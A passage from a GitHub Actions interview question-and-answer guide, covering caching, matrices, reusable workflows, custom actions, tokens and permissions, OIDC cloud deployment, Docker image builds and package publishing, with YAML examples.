There is no `?:` operator, but you can get the same effect with `&&` and `||`:

```yaml
env:
  TARGET: ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}
```

This only works when the "true" value is not empty, `0` or `false`.

## 139: How do you run a script file from the repository?

Check out the code and call the script in a `run` step. Make sure it's executable, or call it through the interpreter.

```yaml
steps:
  - uses: actions/checkout@v6
  - run: ./scripts/deploy.sh
  - run: node scripts/generate-report.mjs
  - run: python scripts/check_links.py
```

Keeping logic in script files instead of long inline `run` blocks makes it easier to test the logic locally and to read the workflow.

## 140: How is GitHub Actions different from Jenkins?

- **Hosting:** Jenkins is a server you install and maintain. GitHub Actions is a hosted service (with optional self-hosted runners).
- **Config:** Jenkins uses Groovy pipelines (`Jenkinsfile`) and a plugin system. GitHub Actions uses YAML and reusable actions.
- **Integration:** GitHub Actions is built into GitHub, so pull request checks, permissions, secrets and events work without extra setup.
- **Flexibility:** Jenkins can do almost anything with plugins and scripting, but it needs more care. GitHub Actions is simpler but has fixed limits, like job timeouts and matrix size.

## 141: What is GitHub Packages and how does it relate to Actions?

GitHub Packages is GitHub's package registry. It supports npm, Maven, Gradle, NuGet, RubyGems and containers (through the container registry `ghcr.io`).

Workflows can publish to it and install from it using `GITHUB_TOKEN`, as long as the token has `packages: write` (to publish) or `packages: read` (to install). No extra tokens are needed for packages in the same repository.

## 142: What is the GitHub Container Registry?

The GitHub Container Registry (`ghcr.io`) stores Docker and OCI images. Images are named like `ghcr.io/OWNER/IMAGE:TAG`.

In a workflow you can log in with `GITHUB_TOKEN`:

```yaml
permissions:
  contents: read
  packages: write

steps:
  - uses: docker/login-action@v3
    with:
      registry: ghcr.io
      username: ${{ github.actor }}
      password: ${{ secrets.GITHUB_TOKEN }}
```

Images can be public or private and can be linked to a repository so they show up on its page.

## 143: How do you build a Docker image in a workflow?

The simplest way is to call `docker build` directly, since Docker is installed on Linux hosted runners.

```yaml
steps:
  - uses: actions/checkout@v6
  - run: docker build -t my-app:${{ github.sha }} .
  - run: docker run --rm my-app:${{ github.sha }} npm test
```

For pushing to a registry, caching layers and multi-platform builds, most teams use `docker/build-push-action` with Buildx instead.

## 144: What is an organization secret?

An organization secret is defined once at the organization level and can be used by many repositories. You choose which repositories can access it: all, only private ones, or a selected list.

They're useful for shared values like a company npm token or a Slack webhook. If a repository has a secret with the same name, the repository secret wins.

## 145: What happens when env is set at the workflow, job and step level?

They are merged, and when the same name appears at more than one level, the more specific level wins.

```yaml
env:
  MODE: workflow
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      MODE: job
    steps:
      - run: echo $MODE # job
      - run: echo $MODE # step
        env:
          MODE: step
```

Variables written to `GITHUB_ENV` are also available to later steps, but a step's own `env` key still overrides them for that step.

## 146: Why does a step fail as soon as one command fails?

Because the default bash shell runs with `-e`, which stops the script at the first command that exits with a non-zero code. The step then fails with that exit code.

If you want a command to be allowed to fail, handle it in the script:

```bash
npm run optional-check || echo "Optional check failed, continuing"
```

Note that without `pipefail`, a failure in the middle of a pipe like `npm test | tee log.txt` is ignored. Set `shell: bash` to get `pipefail` too.

## 147: What are workflow templates?

Workflow templates (also called starter workflows) are ready-made workflow files you can add from the Actions tab. When you click "New workflow", GitHub suggests templates based on your repository's languages, like "Node.js" or "Docker image".

Organizations can also create their own templates in their `.github` repository, so every team starts from the same approved setup.

## 148: How do you deploy a static site to GitHub Pages with Actions?

Set the Pages source to "GitHub Actions" in the repository settings, then use the official Pages actions.

```yaml
on:
  push:
    branches: [main]

permissions:
  contents: read
  pages: write
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run build
      - uses: actions/upload-pages-artifact@v4
        with:
          path: dist
      - id: deployment
        uses: actions/deploy-pages@v4
```

## 149: How do workflow results show up on a pull request?

Each job becomes a check on the pull request, shown in the checks section at the bottom of the conversation tab and on the "Checks" tab. You see whether each check passed, failed or is still running, and you can click through to the logs.

Annotations created by the workflow show up next to the code in "Files changed". The commit itself also gets a status icon (a green check or red cross) in the commit list.

## 150: What are required status checks?

Required status checks are checks that must pass before a pull request can be merged. You set them up in branch protection rules or rulesets for the target branch, by picking the check names, usually your job names.

This is how you make sure no one merges code that breaks the tests. Be careful when a required workflow uses path filters or `[skip ci]`: if the workflow doesn't run, the check stays "expected" and the pull request can't be merged.

# Moderate Questions (151-300)

## 151: How would you set up a CI workflow for a Node.js project?

A typical setup runs on pull requests and pushes to `main`, uses minimal permissions, cancels old runs, caches dependencies and runs lint, type check, tests and build.

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test -- --coverage
      - run: npm run build
```

Old pull request runs get cancelled, but runs on `main` always finish.

## 152: How do you cache npm dependencies with actions/cache?

Cache the npm download folder (`~/.npm`), not `node_modules`, and build the key from the lock file.

```yaml
- uses: actions/cache@v5
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${{ runner.os }}-
- run: npm ci
```

`npm ci` deletes `node_modules` anyway, so caching it doesn't help with `npm ci`. Caching `~/.npm` means npm doesn't have to download packages again. For most projects, `actions/setup-node` with `cache: npm` does the same thing with less config.

## 153: How do cache keys and restore-keys work?

When the cache step runs, it looks for an entry whose key exactly matches `key`. If found, it restores it and that's a "cache hit". The `cache-hit` output is `true`.

If there's no exact match, it tries each `restore-keys` value in order as a **prefix**, and restores the newest entry that starts with that prefix. That's a partial hit, so you get most files and only download what changed.

At the end of the job, if there was no exact hit, it saves a new entry under `key`. An existing key is never overwritten, because cache entries are immutable.

```yaml
key: deps-${{ runner.os }}-${{ hashFiles('pnpm-lock.yaml') }}
restore-keys: |
  deps-${{ runner.os }}-
```

## 154: Which branches can use a cache?

A run can restore caches created on:

- the current branch
- the base branch of a pull request
- the default branch (usually `main`)

It can't restore caches from sibling branches or child branches. So `feature-a` can't use a cache created on `feature-b`. That's why it's a good idea to make sure `main` creates caches too (for example by running CI on push to `main`), so all new branches start with a warm cache.

## 155: What are the cache size limits and how is old cache removed?

Each repository has a cache storage limit (10 GB by default; it can be raised with paid storage). When the total goes over the limit, GitHub deletes the oldest entries until it's back under it.

Entries that haven't been used for 7 days are also removed. You can see and delete caches in the Actions tab under "Caches", or with `gh cache list` and `gh cache delete`.

## 156: When would you use actions/cache/restore and actions/cache/save separately?

`actions/cache` restores at the start and saves at the end automatically. The separate `restore` and `save` actions give you more control:

- Save the cache even when tests fail, so the next run is still fast.
- Save only on `main`, while pull requests only restore. This stops many branches from filling the cache.
- Save in the middle of the job, before steps that change the cached folder.

```yaml
- uses: actions/cache/restore@v5
  id: cache
  with:
    path: ~/.cache/ms-playwright
    key: playwright-${{ hashFiles('package-lock.json') }}

- run: npx playwright install --with-deps

- uses: actions/cache/save@v5
  if: github.ref == 'refs/heads/main' && steps.cache.outputs.cache-hit != 'true'
  with:
    path: ~/.cache/ms-playwright
    key: playwright-${{ hashFiles('package-lock.json') }}
```

## 157: How do you share data between jobs?

There are three main options:

- **Job outputs** for small values like a version number, a tag or a list of changed packages.
- **Artifacts** for files, like build output or test reports.
- **Cache** for dependencies that both jobs need.

For anything bigger, like a Docker image, push it to a registry in one job and pull it in the other. Don't try to pass large data through outputs, because outputs are limited in size and stored as strings.

## 158: How do you pass outputs from one job to another?

Set the output in a step, map it to a job output, and read it with `needs` in the other job.

```yaml
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.tag.outputs.tag }}
    steps:
      - id: tag
        run: echo "tag=v$(date +%Y%m%d).${{ github.run_number }}" >> "$GITHUB_OUTPUT"

  build:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building ${{ needs.version.outputs.tag }}"
```

Job outputs are always strings. If a step output contains a secret, GitHub won't pass it to other jobs.

## 159: How do you build a matrix dynamically?

Have one job produce a JSON array as an output, then use `fromJSON` in the next job's matrix.

```yaml
jobs:
  plan:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.list.outputs.services }}
    steps:
      - uses: actions/checkout@v6
      - id: list
        run: echo "services=$(ls services | jq -R -s -c 'split("\n")[:-1]')" >> "$GITHUB_OUTPUT"

  build:
    needs: plan
    runs-on: ubuntu-latest
    strategy:
      matrix:
        service: ${{ fromJSON(needs.plan.outputs.services) }}
    steps:
      - run: echo "Building ${{ matrix.service }}"
```

If the list can be empty, add `if: needs.plan.outputs.services != '[]'` to the second job, because an empty matrix makes the job fail.

## 160: How do include and exclude work in a matrix?

`exclude` removes combinations from the matrix. `include` adds extra combinations, or adds extra values to existing ones.

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [22, 24]
    exclude:
      - os: windows-latest
        node: 22
    include:
      - os: ubuntu-latest
        node: 24
        coverage: true
      - os: macos-latest
        node: 24
```

Here the Windows plus Node 22 job is removed, the Ubuntu plus Node 24 job gets a `coverage` value, and a new macOS job is added. `exclude` is applied first, then `include`.

## 161: How do you limit how many matrix jobs run at once?

Use `max-parallel`.

```yaml
strategy:
  max-parallel: 2
  matrix:
    region: [us-east-1, eu-west-1, ap-southeast-1, sa-east-1]
```

This is useful when the jobs share a limited resource, like a test database, an API with rate limits, or a deployment where you want to roll out a few regions at a time.

## 162: How do you give matrix jobs readable names?

Set the job `name` using matrix values. Otherwise GitHub shows names like `test (ubuntu-latest, 22)`.

```yaml
jobs:
  test:
    name: Test on ${{ matrix.os }} with Node ${{ matrix.node }}
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [22, 24]
```

Be careful with required status checks: the check name includes the matrix values, so changing the matrix changes the check names and branch protection will wait for names that no longer exist.

## 163: How do you pass inputs and secrets to a reusable workflow?

Declare them under `workflow_call` in the called workflow, then pass them with `with` and `secrets` in the caller.

```yaml
# .github/workflows/deploy.yml (called)
on:
  workflow_call:
    inputs:
      environment:
        type: string
        required: true
    secrets:
      DEPLOY_TOKEN:
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

```yaml
# caller
jobs:
  deploy-staging:
    uses: ./.github/workflows/deploy.yml
    with:
      environment: staging
    secrets:
      DEPLOY_TOKEN: ${{ secrets.STAGING_DEPLOY_TOKEN }}
```

Input types for `workflow_call` are `string`, `number` and `boolean`.

## 164: What does secrets: inherit do?

It passes all secrets the caller can access to the reusable workflow, so you don't have to list them one by one.

```yaml
jobs:
  deploy:
    uses: my-org/shared-workflows/.github/workflows/deploy.yml@v2
    secrets: inherit
```

It's convenient for workflows inside the same organization. The downside is that the called workflow gets more secrets than it may need, so for workflows from outside your control, pass only the secrets that are required.

## 165: How do you return outputs from a reusable workflow?

Map job outputs to workflow outputs under `workflow_call.outputs`. The caller reads them through `needs`.

```yaml
# called workflow
on:
  workflow_call:
    outputs:
      image:
        value: ${{ jobs.build.outputs.image }}

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.meta.outputs.image }}
    steps:
      - id: meta
        run: echo "image=ghcr.io/acme/api:${{ github.sha }}" >> "$GITHUB_OUTPUT"
```

```yaml
# caller
jobs:
  build:
    uses: ./.github/workflows/build.yml
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.image }}"
```

## 166: What are the limits of reusable workflows?

- They can be nested up to 10 levels deep (the top caller plus nine levels of called workflows).
- One workflow run can call at most 50 reusable workflows in total, counting the nested ones.
- A reusable workflow is called as a whole job. You can't call it as a step.
- `env` set in the caller is not passed to the called workflow. Use inputs instead.
- The `GITHUB_TOKEN` permissions can only stay the same or be reduced in the called workflow, never raised.

These limits were raised in late 2025, so older articles may mention 4 levels and 20 workflows.

## 167: How do you call a reusable workflow from another repository?

Use `owner/repo/.github/workflows/file.yml@ref`.

```yaml
jobs:
  ci:
    uses: my-org/shared-workflows/.github/workflows/node-ci.yml@v3
    with:
      node-version: "24"
```

The called workflow's repository must be public, or it must be internal or private and allow access from other repositories in its Actions settings. Pin a tag or a commit SHA, because a branch ref lets every change in the shared repository affect your pipeline right away.

## 168: When would you use a reusable workflow and when a composite action?

**Reusable workflow** when you want to share whole jobs: their runner, environment, matrix, permissions, secrets and multiple jobs. Examples: "standard Node.js CI" or "deploy to Kubernetes with approval".

**Composite action** when you want to share a few steps inside a job. Examples: "set up Node.js, restore cache and install dependencies" or "log in to our registry".

Reusable workflows show each job separately in the logs. Composite actions show up as one step, with their inner steps grouped inside it.

## 169: How do you write a composite action with inputs and outputs?

```yaml
# .github/actions/version/action.yml
name: Compute version
description: Builds a version string from package.json and the run number
inputs:
  prefix:
    description: Prefix for the version
    default: v
outputs:
  version:
    description: The computed version
    value: ${{ steps.compute.outputs.version }}
runs:
  using: composite
  steps:
    - id: compute
      shell: bash
      env:
        PREFIX: ${{ inputs.prefix }}
      run: |
        base=$(node -p "require('./package.json').version")
        echo "version=${PREFIX}${base}-${GITHUB_RUN_NUMBER}" >> "$GITHUB_OUTPUT"
```

```yaml
- uses: ./.github/actions/version
  id: version
- run: echo "${{ steps.version.outputs.version }}"
```

Outputs must be mapped explicitly with `value`, and composite actions can't read the `secrets` context, so secrets have to come in as inputs.

## 170: How do you write a JavaScript action?

Create `action.yml` with `runs.using: node24`, write the code with the Actions toolkit, and bundle it into one file.

```yaml
# action.yml
name: Hello
description: Says hello
inputs:
  who:
    required: true
outputs:
  greeting:
    description: The greeting text
runs:
  using: node24
  main: dist/index.js
```

```js
// src/index.js
import * as core from "@actions/core";

try {
  const who = core.getInput("who", { required: true });
  const greeting = `Hello, ${who}!`;
  core.info(greeting);
  core.setOutput("greeting", greeting);
} catch (error) {
  core.setFailed(error.message);
}
```

Then bundle with a tool like `@vercel/ncc` or Rollup into `dist/index.js` and commit it, because the runner doesn't run `npm install` for actions.

## 171: What are @actions/core and @actions/github?

They are packages from the Actions toolkit for writing JavaScript actions.

`@actions/core` handles the runner side: `getInput`, `setOutput`, `setFailed`, `setSecret`, `exportVariable`, `addPath`, logging (`info`, `warning`, `error`, `notice`, `debug`, `group`), job summaries (`core.summary`) and OIDC tokens (`getIDToken`).

`@actions/github` gives you an authenticated Octokit client and the `context` object with event data.

```js
import * as core from "@actions/core";
import * as github from "@actions/github";

const token = core.getInput("token");
const octokit = github.getOctokit(token);
const { owner, repo } = github.context.repo;
await octokit.rest.issues.createComment({
  owner,
  repo,
  issue_number: github.context.issue.number,
  body: "Thanks for the PR!",
});
```

Other toolkit packages include `@actions/exec`, `@actions/io`, `@actions/tool-cache`, `@actions/cache` and `@actions/artifact`.

## 172: How do you write a Docker container action?

Create a `Dockerfile` and an `action.yml` that points to it. Inputs are passed as arguments or environment variables.

```yaml
# action.yml
name: Check links
description: Checks links in Markdown files
inputs:
  folder:
    default: docs
runs:
  using: docker
  image: Dockerfile
  args:
    - ${{ inputs.folder }}
```

```dockerfile
FROM python:3.13-slim
COPY check.py /check.py
ENTRYPOINT ["python", "/check.py"]
```

The image is built on every run unless you point `image` to a prebuilt image like `docker://ghcr.io/acme/check-links:1.2.0`, which is faster. Docker actions only run on Linux runners.

## 173: How do you publish an action to the Marketplace?

1. Put the action in its own public repository with `action.yml` at the root.
2. Add `name`, `description`, `author` and `branding` (icon and color) to `action.yml`, and write a clear README.
3. Create a release on GitHub and tick "Publish this Action to the GitHub Marketplace".
4. Accept the Marketplace terms the first time.

The action name must be unique in the Marketplace, and each repository can hold only one published action.

## 174: How should you version your own action?

Use semantic version tags like `v1.2.3`, and keep a moving major tag like `v1` that points to the latest `v1.x.y` release. Users then pick `@v1` for automatic fixes or `@v1.2.3` or a SHA for full control.

```bash
git tag -a v1.3.0 -m "v1.3.0"
git push origin v1.3.0
git tag -fa v1 -m "Update v1 to v1.3.0"
git push origin v1 --force
```

Release a new major version for breaking changes such as removing inputs or changing the Node.js runtime. You can turn on immutable releases for the repository so a published version tag can't be moved or deleted.

## 175: What is actions/github-script?

It lets you write a small JavaScript snippet that calls the GitHub API, without creating a full action. It gives you a ready Octokit client (`github`), the `context`, `core`, `glob`, `io` and `exec`.

```yaml
- uses: actions/github-script@v8
  with:
    script: |
      const { data: pr } = await github.rest.pulls.get({
        owner: context.repo.owner,
        repo: context.repo.repo,
        pull_number: context.issue.number,
      });
      core.info(`PR has ${pr.changed_files} changed files`);
      return pr.changed_files;
```

The return value becomes the `result` output. It uses `GITHUB_TOKEN` by default, so remember to set `permissions`.

## 176: How do you comment on a pull request from a workflow?

Use the GitHub CLI or `actions/github-script`. The job needs `pull-requests: write`.

```yaml
permissions:
  pull-requests: write

steps:
  - run: gh pr comment "$PR_NUMBER" --body "Preview deployed to $URL"
    env:
      GH_TOKEN: ${{ github.token }}
      GH_REPO: ${{ github.repository }}
      PR_NUMBER: ${{ github.event.pull_request.number }}
      URL: https://pr-${{ github.event.pull_request.number }}.preview.example.com
```

To avoid a new comment on every push, look for an existing comment from the bot and update it instead (`gh pr comment --edit-last` or a search with the API).

## 177: How do you commit and push changes from a workflow?

Give the job `contents: write`, set a git identity, commit and push.

```yaml
permissions:
  contents: write

steps:
  - uses: actions/checkout@v6
  - run: npm run format
  - run: |
      if git diff --quiet; then
        echo "No changes"
        exit 0
      fi
      git config user.name "github-actions[bot]"
      git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
      git commit -am "chore: format code"
      git push
```

This works because `actions/checkout` keeps the token available to git by default (`persist-credentials: true`). Pushing to a protected branch may need a GitHub App token with bypass rights.

## 178: Why don't pushes made with GITHUB_TOKEN start new workflow runs?

GitHub blocks events created by `GITHUB_TOKEN` from triggering new workflow runs, to avoid infinite loops. If a workflow pushes a commit with `GITHUB_TOKEN`, no `push` workflow runs for that commit. The same goes for pull requests, issues and other events created with it.

The exceptions are `workflow_dispatch` and `repository_dispatch`, which do start new runs.

If you need the push to trigger CI, use a GitHub App installation token or a personal access token instead. Be careful to avoid loops when you do.

## 179: How can one workflow start another workflow?

There are a few ways:

- **Reusable workflow** (`workflow_call`): call it as a job. The run is part of the same workflow run.
- **`workflow_run`**: the second workflow is triggered when the first one completes.
- **`workflow_dispatch`**: call the API or `gh workflow run` from a step.
- **`repository_dispatch`**: send a custom event through the API, also works across repositories.

```yaml
- run: gh workflow run deploy.yml -f environment=staging
  env:
    GH_TOKEN: ${{ github.token }}
```

The job needs `actions: write` to dispatch a workflow with `GITHUB_TOKEN`.

## 180: What is the workflow_run event and when do you use it?

`workflow_run` triggers a workflow when another workflow is requested, in progress or completed.

```yaml
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
    branches: [main]

jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - run: echo "CI passed for ${{ github.event.workflow_run.head_sha }}"
```

It's used to deploy after CI passes, or to do privileged work (like commenting on a fork's pull request) after an unprivileged CI run. The triggered workflow runs from the default branch with access to secrets, so be careful with anything that came from the first run. It also fires when CI fails, so always check `conclusion`.

## 181: What is repository_dispatch?

It's an event you trigger through the REST API with a custom `event_type` and an optional JSON `client_payload`. It's useful for starting workflows from outside GitHub, like a CMS publish or another repository.

```bash
gh api repos/my-org/website/dispatches \
  -f event_type=content-updated \
  -F 'client_payload[page]=pricing'
```

```yaml
on:
  repository_dispatch:
    types: [content-updated]

jobs:
  rebuild:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Rebuilding page ${{ github.event.client_payload.page }}"
```

It always runs on the default branch.

## 182: When and how do you use a GitHub App token instead of GITHUB_TOKEN?

Use an App token when `GITHUB_TOKEN` is not enough: accessing other repositories, triggering workflows with your pushes, bypassing branch protection for a bot, or using permissions `GITHUB_TOKEN` doesn't have.

```yaml
- uses: actions/create-github-app-token@v2
  id: app-token
  with:
    app-id: ${{ vars.RELEASE_APP_ID }}
    private-key: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}
    owner: my-org
    repositories: website,docs

- uses: actions/checkout@v6
  with:
    repository: my-org/docs
    token: ${{ steps.app-token.outputs.token }}
```

App tokens expire after one hour and are limited to the repositories and permissions of the App installation, which makes them safer than personal access tokens.

## 183: When would you use a personal access token in a workflow?

Only when a GitHub App is not an option, for example a quick personal project. If you must, use a fine-grained personal access token limited to the needed repositories and permissions, with an expiration date.

The problems with personal access tokens are that they act as a real user, stop working when that person leaves, and often have more access than needed. In an organization, a GitHub App or OIDC is almost always the better choice.

## 184: How do you set different permissions per job?

Set `permissions` at the job level. Job permissions replace the workflow-level ones for that job.

```yaml
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm test

  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write
      packages: write
    steps:
      - run: echo "Only this job can write"
```

This way the test job, which runs lots of third-party code from npm, never gets write access.

## 185: What permission scopes does GITHUB_TOKEN have?

Each scope can be `read`, `write` or `none`. Common ones:

- `contents`: code, commits, releases
- `pull-requests`: pull requests and their comments
- `issues`: issues and their comments
- `packages`: GitHub Packages
- `actions`: workflow runs, artifacts, caches
- `checks` and `statuses`: check runs and commit statuses
- `deployments`: deployments
- `pages`: GitHub Pages
- `id-token`: request an OIDC token (only `write` or `none`)
- `security-events`: code scanning results
- `attestations`: artifact attestations
- `discussions`: discussions

You can also use the shortcuts `read-all`, `write-all`, or `{}` for no permissions at all.

## 186: How do you deploy with environments and manual approval?

Create the environment in Settings, then Environments, add required reviewers, and reference it in the deploy job.

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}
```

When the job is reached, it stops in a "Waiting" state. One of the reviewers has to approve it in the run page before it starts and gets access to the environment's secrets. The `url` shows up as a link on the run and in the deployments list.

## 187: What protection rules can an environment have?

- **Required reviewers**: up to 6 users or teams, one of whom must approve. You can also stop people from approving their own deployments.
- **Wait timer**: a delay of up to 30 days before the job starts.
- **Deployment branches and tags**: only allow deployments from certain branches or tags.
- **Custom deployment protection rules**: a GitHub App (yours or a partner's) decides, for example based on monitoring or a change ticket.
- **Allow administrators to bypass**: can be turned off so even admins follow the rules.

Some of these rules require a paid plan for private repositories.

## 188: How do you make sure only main can deploy to production?

Set "Deployment branches and tags" on the `production` environment to "Selected branches and tags" and add `main` (and maybe release tags like `v*`).

Then any job that uses `environment: production` from another branch fails right away, even if someone edits the workflow file in their branch. This is stronger than an `if: github.ref == 'refs/heads/main'` check, which lives in the workflow file and can be changed in a pull request.

## 189: What is OpenID Connect (OIDC) in GitHub Actions?

OIDC lets a workflow get short-lived cloud credentials without storing any long-lived keys in GitHub secrets.

The job asks GitHub for a signed token (a JWT) that says which repository, branch, environment and workflow it is. The cloud provider (AWS, Azure, Google Cloud, HashiCorp Vault and others) checks the signature and the claims, and if they match a trust policy, it gives back temporary credentials.

The job needs `permissions: id-token: write` to request the token. The benefits are no secrets to leak or rotate, and access that can be limited to a specific branch or environment.

## 190: How do you deploy to AWS using OIDC?

1. In AWS IAM, add GitHub as an OIDC identity provider (`token.actions.githubusercontent.com`).
2. Create an IAM role with a trust policy that allows your repository.
3. Use `aws-actions/configure-aws-credentials` in the workflow.

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v6
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy-prod
          aws-region: eu-west-1
      - run: aws s3 sync dist/ s3://my-site-bucket --delete
```

No AWS access keys are stored anywhere.

## 191: How do you limit which workflows can assume a cloud role with OIDC?

Check the `sub` (subject) claim in the cloud provider's trust policy. The `sub` depends on how the job runs, for example:

- `repo:my-org/my-repo:ref:refs/heads/main` for a branch
- `repo:my-org/my-repo:environment:production` for a job with an environment
- `repo:my-org/my-repo:pull_request` for pull requests

An AWS trust policy condition:

```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"
  }
}
```

Never use a wildcard like `repo:my-org/*` for a production role. That would let any repository in the organization, and any branch, assume it.

## 192: What claims does the GitHub OIDC token contain?

Besides the standard JWT fields (`iss`, `aud`, `sub`, `exp`, `iat`), it has many GitHub-specific claims:

- `repository`, `repository_owner`, `repository_id`, `repository_visibility`
- `ref`, `ref_type`, `sha`
- `environment`
- `event_name`, `actor`, `actor_id`
- `workflow`, `workflow_ref`, `job_workflow_ref`
- `run_id`, `run_number`, `run_attempt`
- `runner_environment` (`github-hosted` or `self-hosted`)

Cloud providers can match on these in their trust policies. Using IDs (like `repository_id`) is safer than names, because names can be reused after a repository is deleted or renamed.

## 193: How do you build and push a Docker image to GHCR?

```yaml
permissions:
  contents: read
  packages: write

jobs:
  image:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v6
        with:
          context: .
          push: ${{ github.event_name != 'pull_request' }}
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
```

On pull requests the image is only built to check that it works. On `main` it is also pushed. Note that image names must be lowercase, so if your org or repo name has capital letters, lowercase it first (or use `docker/metadata-action`, which does that for you).

## 194: How do you create image tags with docker/metadata-action?

`docker/metadata-action` builds tags and OCI labels from the git context: branch name, tag, SHA, pull request number and so on.

```yaml
- id: meta
  uses: docker/metadata-action@v5
  with:
    images: ghcr.io/${{ github.repository }}
    tags: |
      type=ref,event=branch
      type=ref,event=pr
      type=semver,pattern={{version}}
      type=semver,pattern={{major}}.{{minor}}
      type=sha

- uses: docker/build-push-action@v6
  with:
    push: true
    tags: ${{ steps.meta.outputs.tags }}
    labels: ${{ steps.meta.outputs.labels }}
```

Pushing the git tag `v1.4.2` creates image tags `1.4.2`, `1.4` and `sha-<short sha>`.

## 195: How do you cache Docker layers in GitHub Actions?

With Buildx you can use the GitHub Actions cache backend (`type=gha`), which stores layers in the same cache storage that `actions/cache` uses.

```yaml
- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    context: .
    push: true
    tags: ghcr.io/acme/api:${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

`mode=max` caches layers of all build stages, not just the final one, which helps multi-stage builds. For big images, a registry cache (`type=registry,ref=ghcr.io/acme/api:buildcache`) is often better, because the Actions cache has a size limit per repository.

## 196: How do you build multi-platform Docker images?

Set up QEMU and Buildx, then list the platforms.

```yaml
- uses: docker/setup-qemu-action@v3
- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    platforms: linux/amd64,linux/arm64
    push: true
    tags: ghcr.io/acme/api:latest
```

QEMU emulation is slow, especially for steps that compile code. A faster option is to build each platform on a native runner (`ubuntu-latest` and `ubuntu-24.04-arm`) in a matrix, push by digest, and then join them into one manifest list in a final job.

## 197: How do you publish an npm package from a workflow?

The recommended way is npm trusted publishing with OIDC, so no npm token is stored. You link the GitHub repository and workflow to the package in the npm settings, then:

```yaml
on:
  release:
    types: [published]

permissions:
  contents: read
  id-token: write

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 24
          registry-url: https://registry.npmjs.org
      - run: npm ci
      - run: npm test
      - run: npm publish
```

npm adds provenance automatically with trusted publishing. Trusted publishing needs a recent npm CLI (11.5.1 or newer). The older way is to store an `NPM_TOKEN` secret and pass it as `NODE_AUTH_TOKEN`.

## 198: How do you create a GitHub release from a workflow?

Use the GitHub CLI, which is preinstalled. The job needs `contents: write`.

```yaml
on:
  push:
    tags: ["v*"]

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run build && tar -czf dist.tar.gz dist
      - run: gh release create "$TAG" dist.tar.gz --generate-notes --verify-tag
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ github.ref_name }}
```

`--generate-notes` writes release notes from the merged pull requests since the last release.

## 199: How can you automate versioning and changelogs?

Common tools:

- **release-please** (`googleapis/release-please-action`): reads Conventional Commits, keeps a release pull request open with the next version and changelog, and creates the release when you merge it.
- **semantic-release**: decides the version from commit messages and publishes in one CI run.
- **Changesets**: developers add small change files in their pull requests, and a workflow opens a "Version packages" pull request. Popular in monorepos.

All of them need write permissions and often a GitHub App token, so that the release pull request or tag can trigger other workflows.

## 200: How do you make sure a service container is ready before tests start?

Add a health check in the service's `options`. The runner waits until the container is healthy before it starts the steps.

```yaml
services:
  mysql:
    image: mysql:8.4
    env:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: app_test
    ports:
      - 3306:3306
    options: >-
      --health-cmd "mysqladmin ping -h localhost"
      --health-interval 10s
      --health-timeout 5s
      --health-retries 10
```

Without a health check, the steps can start while the database is still booting, and the first tests fail with connection errors.

## 201: How do you connect to a service container from your steps?

It depends on where the job runs:

- **Job runs directly on the runner** (no `container` key): map the ports and connect to `localhost:<port>`.
